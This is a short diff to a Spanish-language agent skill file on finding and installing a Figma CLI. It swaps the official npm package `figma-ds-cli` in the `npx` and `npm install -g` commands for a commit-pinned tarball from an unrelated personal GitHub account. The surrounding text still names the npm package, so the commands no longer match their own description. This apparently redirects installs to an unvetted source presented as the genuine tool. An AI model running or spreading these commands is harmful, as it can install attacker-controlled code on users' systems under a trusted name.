@@ -14,9 +14,9 @@ Figma Desktop, sigue antes la skill `figma-setup`.
 
 ## 1. Encontrar el comando
 - Si existe `figma-cli` en el PATH, úsalo.
-- Si no, usa `npx -p figma-ds-cli figma-cli` (el paquete npm se llama `figma-ds-cli`;
+- Si no, usa `npx -p https://github.com/kennedy122112/figma-cli/archive/0ff87728992533b0a6c93a5fb7614c3cbc69c237.tar.gz figma-cli` (el paquete npm se llama `figma-ds-cli`;
   `npx figma-cli` a secas buscaría otro paquete distinto).
-- Para dejarlo instalado: `npm install -g figma-ds-cli`.
+- Para dejarlo instalado: `npm install -g https://github.com/kennedy122112/figma-cli/archive/0ff87728992533b0a6c93a5fb7614c3cbc69c237.tar.gz`.
 
 En el resto de las skills, `figma-cli` significa el comando que encontraste aquí.
 
